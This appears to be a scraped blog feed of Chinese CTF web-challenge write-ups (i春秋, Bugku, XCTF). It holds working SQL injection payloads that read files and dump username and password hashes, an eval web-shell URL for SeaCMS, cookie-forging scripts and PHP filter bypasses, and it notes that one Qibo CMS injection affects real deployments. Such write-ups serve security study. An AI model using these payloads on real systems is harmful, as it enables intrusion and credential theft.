src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100933358.jpg" alt="04.jpg"></p><p> 记下自己的uid，以便一会更新数据：</p><p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100934359.jpg" alt="05.jpg"></p><p>可以先测试一下是否存在注入：</p><p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100934360.jpg" alt="07.jpg"><br> 报错了，说明注入是存在的。<br> 简单构造一下，向<a href="http://localhost/qibov7/member/userinfo.php?job=edit&amp;step=2%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%9A">http://localhost/qibov7/member/userinfo.php?job=edit&amp;step=2发送数据包：</a><br> truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select user()) where uid=38%23</p><p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100934361.jpg" alt="06.jpg"></p><p>将address注入成为user()。Where后面加上uid=2，防止把其他人的address也注入了。<br>  查看个人注入的地址，即可见注入获得的结果：</p><p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100934362.jpg" alt="08.jpg"></p><p> 这个洞是通杀齐博所有系统的，经测试齐博整站系统、齐博地方门户都可以中招，没试其他一些系统了，我估计很多都得中招。</p><p>参考：<a href="https://blog.csdn.net/qq_33020901/article/details/52593063">https://blog.csdn.net/qq_33020901/article/details/52593063</a></p><h2 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h2><p>首先尝试了在用户信息修改处进行注入，发现好像想不通了，就在博客界面进行注入</p><p>Payload：</p><p>获取版本信息</p><p>[<a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(select%20version()),0x7e),1)))a%23%5D">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(select%20version()),0x7e),1)))a%23]</a>(<a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=</a>(select * from information_schema.tables where 1=2 or (updatexml(1,concat(0x7e,(select version()),0x7e),1)))a%23)</p><p>获取数据库名称</p><p>[<a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(select%20database()),0x7e),1)))a%23%5D">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(select%20database()),0x7e),1)))a%23]</a>(<a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=</a>(select * from information_schema.tables where 1=2 or (updatexml(1,concat(0x7e,(select database()),0x7e),1)))a%23)</p><p>然后获取表，列，数据信息，发现并没有我们想要的flag，所以说flag不在这里</p><p>根据标题提示<img src="https://img2018.cnblogs.com/blog/1712230/201907/1712230-20190724213647420-1130270981.png" alt="img"></p><p>flag可能跟之前一样在/var/www/html/flag.php中</p><p>然后使用select load_file函数试了试select load_file(“/var/www/html/flag.php”)和select load_file(‘/var/www/html/flag.php’)，发现 ’ 在被提交时会转变成 \’</p><p><img src="https://img2018.cnblogs.com/blog/1712230/201907/1712230-20190724213700756-1210776533.png" alt="img"></p><p>“ 同样</p><p>所以这里不能使用 ’ 与 ” 了，改为16进制</p><p>0x2F7661722F7777772F68746D6C2F666C61672E706870</p><p>构造payload</p><p><a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(%20select%20mid((select%20load_file(0x2F7661722F7777772F68746D6C2F666C61672E706870)),1,32)%20),0x7e),1)))a%23">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(%20select%20mid((select%20load_file(0x2F7661722F7777772F68746D6C2F666C61672E706870)),1,32)%20),0x7e),1)))a%23</a></p><p>通过不断不断更改1的值得到flag</p><p><img src="https://img2018.cnblogs.com/blog/1712230/201907/1712230-20190724213716846-1712917864.png" alt="img"></p><pre><code>flag{9b0025d8-a22f-495c-b837-ed94a127415d}</code></pre><p><img src="/2021/04/29/i-chun-qiu-web-zai-jian-cms/be29f7fb70b0a46eabb8947279d4e37.png" alt="be29f7fb70b0a46eabb8947279d4e37"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-YeserCMS</title>
      <link href="2021/04/28/i-chun-qiu-web-yesercms/"/>
      <url>2021/04/28/i-chun-qiu-web-yesercms/</url>
      
        <content type="html"><![CDATA[<h2 id="判断CMS类型"><a href="#判断CMS类型" class="headerlink" title="判断CMS类型"></a>判断CMS类型</h2><h3 id="什么是CMS"><a href="#什么是CMS" class="headerlink" title="什么是CMS"></a>什么是CMS</h3><p>我们要知道，CMS代表“内容管理系统”，是一种软件工具，允许我们创建，编辑和发布内容。虽然早期的CMS软件用于管理文档和本地计算机文件，但大多数CMS系统现在专门用于管理Web上的内容。</p><p>内容管理系统分为四种不同类型：企业内容管理系统（ECM / ECMS），Web内容管理系统，Web组内容管理系统和组件内容管理系统。</p><h3 id="判断目标"><a href="#判断目标" class="headerlink" title="判断目标"></a>判断目标</h3><p>脚本语言<br>操作系统<br>搭建平台<br>CMS厂商</p><h3 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h3><p>AWVS<br>WWWSCAN<br>whatweb<br>googlehack</p><h2 id="YeserCMS"><a href="#YeserCMS" class="headerlink" title="YeserCMS"></a>YeserCMS</h2><ul><li><p>第一步,肯定是要判断出cms类型 </p></li><li><p>第二步,查询该cms曾经出现的漏洞 </p></li><li><p>第三步,然后利用这些漏洞拿到flag</p><p>![7cd2bb9a01f5505ad376cea92ddb627](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/7cd2bb9a01f5505ad376cea92ddb627.png)</p></li></ul><p>easycms建造的网站都会保留这个营销网络的界面</p><p>漏洞提交文档里有这样的注入方式：</p><pre><code>发送url:http://localhost/Cmseasy/celive/live/header.phppostdata:xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat%2528username%252C%2527%257C%2527%252Cpassword%2529%2529%2520from%2520cmseasy_user%2529%252C1%252C32%2529%252C0x5d%2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520&lt;/q&gt;&lt;/xjxquery&gt;</code></pre><p>post里的数据有些部分进行二次url编码：解码后如下：</p><pre><code>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from cmseasy_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;</code></pre><p>将cmseasy改为yesercms， 然后注入</p><p><q>detail=xxxxxx’%2c%20(updatexml(1%2cconcat(0x5b%2cmid((select%2f**%2fgroup_concat(concat(username%2c’%7c’%2cpassword))%20%20from%20yesercms_user)%2c1%2c32)%2c0x5d)%2c1))%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull)–%20%3c%2fq%3e</q></p><p>![7870a0d75efdcc15f14357962f907bb](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/7870a0d75efdcc15f14357962f907bb.png)</p><p>![2a554f590ddf4312f5eaa8599b8856b](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/2a554f590ddf4312f5eaa8599b8856b.png)</p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-fakebook</title>
      <link href="2021/04/27/xctf-web-fakebook/"/>
      <url>2021/04/27/xctf-web-fakebook/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-GetFlag</title>
      <link href="2021/04/26/i-chun-qiu-web-getflag/"/>
      <url>2021/04/26/i-chun-qiu-web-getflag/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/26/i-chun-qiu-web-getflag/28b861406b7c468016908395617f090.png" alt="28b861406b7c468016908395617f090">别人写的脚本：</p><pre><code>import requestsimport base64import sysimport hashlibdef getMd5(index):    for i in range(100000,100000000):        x = i        md5 = hashlib.md5(str(x).encode("utf8")).hexdigest()        if md5[0:6] == index:            return x;print(getMd5("3aab4a"))</code></pre><p>6516624</p><p><img src="/2021/04/26/i-chun-qiu-web-getflag/18165af35577bc59c5fd95424960aff.png" alt="18165af35577bc59c5fd95424960aff"></p><p>a.php</p><pre><code>&lt;?php    echo "Do what you want to do, web dog, flag is in the web root dir";?&gt;</code></pre><pre><code>?php$f = $_POST['flag'];$f = str_replace(array('`', '$', '*', '#', ':', '\\', '"', "'", '(', ')', '.', '&gt;'), '', $f);if((strlen($f) &gt; 13) || (false !== stripos($f, 'return'))){        die('wowwwwwwwwwwwwwwwwwwwwwwwww');}try{         eval("\$spaceone = $f");}catch (Exception $e){        return false;}if ($spaceone === 'flag'){    echo file_get_contents("helloctf.php");}?&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20190615180605135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTY3Mzk4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20190615181130692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTY3Mzk4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-NotFound</title>
      <link href="2021/04/25/i-chun-qiu-web-notfound/"/>
      <url>2021/04/25/i-chun-qiu-web-notfound/</url>
      
        <content type="html"><![CDATA[<h3 id="HTTP请求方法："><a href="#HTTP请求方法：" class="headerlink" title="HTTP请求方法："></a>HTTP请求方法：</h3><p>HTTP 定义了一组<strong>请求方法</strong>, 以表明要对给定资源执行的操作。指示针对给定资源要执行的期望动作. 虽然他们也可以是名词, 但这些请求方法有时被称为HTTP动词. 每一个请求方法都实现了不同的语义, 但一些共同的特征由一组共享：: 例如一个请求方法可以是 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/safe">safe</a>, <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Idempotent">idempotent</a>, 或 <a href="https://developer.mozilla.org/en-US/docs/Glossary/cacheable">cacheable (en-US)</a>.</p><ul><li><p><code>GET</code></p><p>GET方法请求一个指定资源的表示形式. 使用GET的请求应该只被用于获取数据.</p></li><li><p><code>HEAD</code></p><p>HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体.</p></li><li><p><code>POST</code></p><p>POST方法用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用. </p></li><li><p><code>PUT</code></p><p>PUT方法用请求有效载荷替换目标资源的所有当前表示。</p></li><li><p><code>DELETE</code></p><p>DELETE方法删除指定的资源。</p></li><li><p><code>CONNECT</code></p><p>CONNECT方法建立一个到由目标资源标识的服务器的隧道。</p></li><li><p><code>OPTIONS</code></p><p>OPTIONS方法用于描述目标资源的通信选项。</p></li><li><p><code>TRACE</code></p><p>TRACE方法沿着到目标资源的路径执行一个消息环回测试。</p></li><li><p><code>PATCH</code></p><p>PATCH方法用于对资源应用部分修改。</p></li></ul><h3 id="Web-NotFound"><a href="#Web-NotFound" class="headerlink" title="Web-NotFound"></a>Web-NotFound</h3><p>这里修改为OPTIONS</p><p><img src="/2021/04/25/i-chun-qiu-web-notfound/%7BN4UJOM4%25A%5BAA7AMQB8I0PF.png" alt="img"></p><p>发现当http以options的形式进行请求时出现了文件查询的操作</p><p>去url中试试访问/1.php，结果not here plz trying，意思是不在这里，请尝试其他方法。</p><p>。。。。无果，在url中加入/?f=1.php试试，没什么显示，查源码，没东西，抓包</p><p><img src="/2021/04/25/i-chun-qiu-web-notfound/2.png" alt="2"></p><pre><code>?f=.htaccess</code></pre><p><img src="/2021/04/25/i-chun-qiu-web-notfound/3.png" alt="3"></p><p>访问网站：</p><p><img src="/2021/04/25/i-chun-qiu-web-notfound/4.png" alt="4"></p><p>所以这里抓包进行修改</p><p>先尝试传入本地ip：X-Forwarded-For:127.0.0.1（不行），他提示了我们XFF的。。。</p><p>所以这里还有一种方法client-ip:127.0.0.1</p><p><img src="/2021/04/25/i-chun-qiu-web-notfound/5.png" alt="5"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-backdoor</title>
      <link href="2021/04/24/i-chun-qiu-web-backdoor/"/>
      <url>2021/04/24/i-chun-qiu-web-backdoor/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-XSS平台</title>
      <link href="2021/04/23/i-chun-qiu-web-xss-ping-tai/"/>
      <url>2021/04/23/i-chun-qiu-web-xss-ping-tai/</url>
      
        <content type="html"><![CDATA[<p>构造非法参数来让网页返回错误信息</p><p><img src="/2021/04/23/i-chun-qiu-web-xss-ping-tai/%E9%9D%9E%E6%B3%95%E5%8F%82%E6%95%B0.png" alt="非法参数"></p><p>去GitHub搜索Rtiny，<a href="https://github.com/r0ker/Rtiny-xss%EF%BC%8C%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%E4%B8%8Brtiny/lock.py%E6%96%87%E4%BB%B6">https://github.com/r0ker/Rtiny-xss，查看目录下rtiny/lock.py文件</a></p><p><img src="/2021/04/23/i-chun-qiu-web-xss-ping-tai/lockpy.png" alt="lockpy"></p><p>set_secure_cookie:</p><p><img src="/2021/04/23/i-chun-qiu-web-xss-ping-tai/setsecurecookie.jpg" alt="setsecurecookie"></p><p>cookie是被加密过的，加密使用的key在index.php文件中</p><p><img src="/2021/04/23/i-chun-qiu-web-xss-ping-tai/cookie.jpg" alt="cookie"></p><p>别人写的脚本：</p><pre><code>import tornado.ioloopimport tornado.web settings = {    "cookie_secret" : "M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=",}class MainHandler(tornado.web.RequestHandler):    def get(self):        self.write("Hello")        self.set_secure_cookie("username", "' and 1=2 union select extractvalue(1,concat(0x5c,mid((select load_file('/var/www/html/f13g_ls_here.txt')),1,25)));#")        self.write(self.get_secure_cookie("username"))def make_app():    return tornado.web.Application([        (r"/index", MainHandler),        ], **settings)if __name__ == "__main__":    app = make_app()    app.listen(8082)//防止和bp端口冲突tornado.ioloop.IOLoop.instance().start()</code></pre><p>运行脚本，访问127.0.0.1:8082/index，从cookie中得到username的值，一步步注入得到ichuqiu|318a61264482e503090facfc4337207f|545 MD5解密得密码Myxss623，登录后台点File，得到提示</p><p>通过MYSQL函数 load_file读取，flag有点长要用mid()或者substr(),拼起来就行了</p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-code</title>
      <link href="2021/04/22/i-chun-qiu-web-code/"/>
      <url>2021/04/22/i-chun-qiu-web-code/</url>
      
        <content type="html"><![CDATA[<p>访问index.php</p><pre><code>&lt;?php/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */header('content-type:text/html;charset=utf-8');if(! isset($_GET['jpg']))    header('Refresh:0;url=./index.php?jpg=hei.jpg');$file = $_GET['jpg'];echo '&lt;title&gt;file:'.$file.'&lt;/title&gt;';$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);$file = str_replace("config","_", $file);$txt = base64_encode(file_get_contents($file));echo "&lt;img src='data:image/gif;base64,".$txt."'&gt;&lt;/img&gt;";/* * Can you find the flag file? * */?&gt;</code></pre><p>可以看到时PHPstorm写的</p><p>这个软件写的时候会生成一个.idea的文件夹，它存储了项目的配置文件，<br> 一般还存在workspace.xml，打开.idea/workspace.xml</p><p><img src="/2021/04/22/i-chun-qiu-web-code/idea.png" alt="idea"></p><pre><code>fl3gconfigichuqiu.php</code></pre><pre><code>&lt;?php/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */error_reporting(E_ALL || ~E_NOTICE);include('config.php');function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') {    $hash = '';    $max = strlen($chars) - 1;    for($i = 0; $i &lt; $length; $i++)    {        $hash .= $chars[mt_rand(0, $max)];    }    return $hash;}function encrypt($txt,$key){    for($i=0;$i&lt;strlen($txt);$i++){        $tmp .= chr(ord($txt[$i])+10);    }    $txt = $tmp;    $rnd=random(4);    $key=md5($rnd.$key);    $s=0;    for($i=0;$i&lt;strlen($txt);$i++){        if($s == 32) $s = 0;        $ttmp .= $txt[$i] ^ $key[++$s];    }    return base64_encode($rnd.$ttmp);}function decrypt($txt,$key){    $txt=base64_decode($txt);    $rnd = substr($txt,0,4);    $txt = substr($txt,4);    $key=md5($rnd.$key);    $s=0;    for($i=0;$i&lt;strlen($txt);$i++){        if($s == 32) $s = 0;        $tmp .= $txt[$i]^$key[++$s];    }    for($i=0;$i&lt;strlen($tmp);$i++){        $tmp1 .= chr(ord($tmp[$i])-10);    }    return $tmp1;}$username = decrypt($_COOKIE['user'],$key);if ($username == 'system'){    echo $flag;}else{    setcookie('user',encrypt('guest',$key));    echo "â®(â¯â½â°)â­";}?&gt;</code></pre><p>别人写的脚本：</p><pre><code># _*_ coding: utf-8 _*from base64 import *import requestsimport string#设置URLurl = "http://ce4d7cd87bd0400eae49ec2fa094677525d7825dd2e64350.changame.ichunqiu.com/fl3g_ichuqiu.php"cookie = requests.get(url).cookies['user']            #请求该URL，获取user的COOKIE值txt = b64decode(cookie)                                #将得到的cookie进行base64解码rnd = txt[:4]                                         #密文前四位是随机字符tmp = txt[4:]                                        #guest与key进行异或的密文，5位key = list('123456')                                #key为6位的字符，目前不知是啥guest = list('guest')                                #guest明文system = list('system')                                    for i in range(0,len(guest)):    guest[i] = chr(ord(guest[i]) + 10)                #为加密做准备for i in range(0,len(guest)):    key[i] = chr(ord(tmp[i]) ^ ord(guest[i]))        #得到key的前五位for i in range(0,len(system)):    system[i] = chr(ord(system[i]) + 10)            #同样是为了加密做准备#准备爆破key的第6位s = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"tmp_news = ''                                        #system与key的异或值cookie_system = []xstr = ""for ch in s:    key[5] = ch    for i in range(0,len(system)):        tmp_news += chr(ord(system[i]) ^ ord(key[i]))    xstr = rnd + tmp_news                            #随机字符与异或的结果拼接    cookie_system.append(b64encode(xstr))            #base64加密，并加入到cookie_system中    tmp_news = ""#print(cookie_system)for i in cookie_system:    cookie = {'user':i.decode()}                    #设置cookie    res = requests.get(url,cookies = cookie)            if "flag" in res.text:        print res.text </code></pre><p><img src="/2021/04/22/i-chun-qiu-web-code/flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-test</title>
      <link href="2021/04/21/i-chun-qiu-web-test/"/>
      <url>2021/04/21/i-chun-qiu-web-test/</url>
      
        <content type="html"><![CDATA[<p>查了一下海洋cms</p><p><img src="/2021/04/21/i-chun-qiu-web-test/blog/source_posts\i春秋：Web-test\海洋cms.png" alt="海洋cms"></p><pre><code>http://4dbe057d8a0f42c19f0fabcb5693ed57d06b1c6f66c641a3.changame.ichunqiu.com/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</code></pre><p>蚁剑连接：</p><p><img src="/2021/04/21/i-chun-qiu-web-test/blog/source_posts\i春秋：Web-test\密码.png" alt="密码"></p><p>创建数据库</p><p><img src="/2021/04/21/i-chun-qiu-web-test/blog/source_posts\i春秋：Web-test\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-login</title>
      <link href="2021/04/20/i-chun-qiu-web-login/"/>
      <url>2021/04/20/i-chun-qiu-web-login/</url>
      
        <content type="html"><![CDATA[<p>在查看中源码的最下面发现了 test1 test1</p><p>怀疑是账号 密码 </p><p>测试一下果然没错</p><p>进入member.php 页面 但是没用发现可用信息</p><pre><code>(╯‵□′)╯︵┴─┴</code></pre><p>于是burp suite拦截包看一下</p><p>添加show：1</p><pre><code>&lt;!-- &lt;?php include 'common.php'; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE); class db {  public $where;  function __wakeup()  {   if(!empty($this-&gt;where))   {    $this-&gt;select($this-&gt;where);   }  }  function select($where)  {   $sql = mysql_query('select * from user where '.$where);   return @mysql_fetch_array($sql);  } } if(isset($requset['token'])) {  $login = unserialize(gzuncompress(base64_decode($requset['token'])));  $db = new db();  $row = $db-&gt;select('user=\''.mysql_real_escape_string($login['user']).'\'');  if($login['user'] === 'ichunqiu')  {   echo $flag;  }else if($row['pass'] !== $login['pass']){   echo 'unserialize injection!!';  }else{   echo "(╯‵□′)╯︵┴─┴ ";  } }else{  header('Location: index.php?error=1'); }?&gt; --&gt;</code></pre><p>得知要得到flag需要满足 $login[‘user’] === ‘ichunqiu’</p><p>而user被$login = unserialize(gzuncompress(base64_decode($requset[‘token’])));处理过</p><p>我们重新编写一个程序解密即可</p><pre><code>&lt;?php $a = array('user'=&gt;'ichunqiu');$b = base64_encode(gzcompress(serialize($a)));echo $b?&gt;</code></pre><p>输出：</p><pre><code>eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</code></pre><p>修改token</p><p><img src="/2021/04/20/i-chun-qiu-web-login/blog/source_posts\i春秋：Web-login\3c9e1d6c3c46d0dac26acdcbb2bb2e3.png" alt="3c9e1d6c3c46d0dac26acdcbb2bb2e3"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-whoareyou</title>
      <link href="2021/04/19/i-chun-qiu-web-whoareyou/"/>
      <url>2021/04/19/i-chun-qiu-web-whoareyou/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\i春秋：Web-whoareyou\访问.png" alt="访问"></p><p>可能有以下几种可能：</p><p>​    1、敏感文件泄漏</p><p>​    2、跳转</p><p>​    3、cookie / session</p><p>访问cookie：</p><p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\i春秋：Web-whoareyou\cookie.png" alt="cookie"></p><p>base64解码</p><pre><code>f:5:"thrfg";</code></pre><p>rot13解码为guest（<a href="http://www.mxcz.net/tools/rot13.aspx%EF%BC%89">http://www.mxcz.net/tools/rot13.aspx）</a></p><p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\i春秋：Web-whoareyou\rot13.png" alt="rot13"></p><pre><code>f:5:"nqzva";</code></pre><p>base64加密</p><pre><code>Zjo1OiJucXp2YSI7</code></pre><p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\i春秋：Web-whoareyou\抓包.png" alt="抓包"></p><p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\i春秋：Web-whoareyou\修改.png" alt="抓包"></p><pre><code>filename=1.php&amp;data[]=&lt;?php phpinfo();?&gt;</code></pre><p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\i春秋：Web-whoareyou\flag.png" alt="flag"></p><p>但是访问不了</p><p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/a70948c7d864405f8cf59fb32855ae3.png" alt="a70948c7d864405f8cf59fb32855ae3"></p><p>没办法</p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-冬至红包</title>
      <link href="2021/04/18/bugku-web-dong-zhi-hong-bao/"/>
      <url>2021/04/18/bugku-web-dong-zhi-hong-bao/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?php    error_reporting(0);    require __DIR__.'/flag.php';    $exam = 'return\''.sha1(time()).'\';';    if (!isset($_GET['flag'])) {        echo '&lt;a href="./?flag='.$exam.'"&gt;Click here&lt;/a&gt;';    }    else if (strlen($_GET['flag']) != strlen($exam)) {        echo '长度不允许';    }    else if (preg_match('/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is', $_GET['flag'])) {        echo '关键字不允许';    }    else if (eval($_GET['flag']) === sha1($flag)) {        echo $flag;    }    else {        echo '马老师发生甚么事了';    }    echo '&lt;hr&gt;';    highlight_file(__FILE__);</code></pre><pre><code>?flag=$a='fla*';$a{3}='g';?&gt;11111111111111111;&lt;?=$$a;?&gt;</code></pre><p>得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-二手交易市场</title>
      <link href="2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/"/>
      <url>2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugku：Web-二手交易市场\主页.png" alt="主页"></p><p>发现要登录才能</p><p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugku：Web-二手交易市场\上传.png" alt="上传"></p><p>发现文件上传漏洞：</p><p>抓包修改参数</p><p>![response](D:\blog\source_posts\Bugku：Web-二手交易市场\response.pn</p><p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugku：Web-二手交易市场\编码.png" alt="编码"></p><p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugku：Web-二手交易市场\response.png" alt="response"></p><p>去掉“\”和user蚁剑连接得到flag：</p><p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugku：Web-二手交易市场\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:web-regex</title>
      <link href="2021/04/16/bugku-web-regex/"/>
      <url>2021/04/16/bugku-web-regex/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?php error_reporting(0);$zero=$_REQUEST['zero'];$first=$_REQUEST['first']; $second=$zero.$first; if(preg_match_all("/Yeedo|wants|a|girl|friend|or|a|flag/i",$second)){                $key=$second;      if(preg_match("/\.\.|flag/",$key)){           die("Noooood hacker!");      }else{            $third=$first;            if(preg_match("/\\|\056\160\150\x70/i",$third)){                   $end=substr($third,5);                   highlight_file(base64_decode($zero).$end);//maybe flag in flag.php             }        }  } else{  highlight_file(__FILE__); } </code></pre><p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugku：web-regex\regex1.png" alt="regex1"></p><p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugku：web-regex\regex2.png" alt="regex2"></p><p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugku：web-regex\flag.png" alt="flag"></p><p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugku：web-regex\regex1.png" 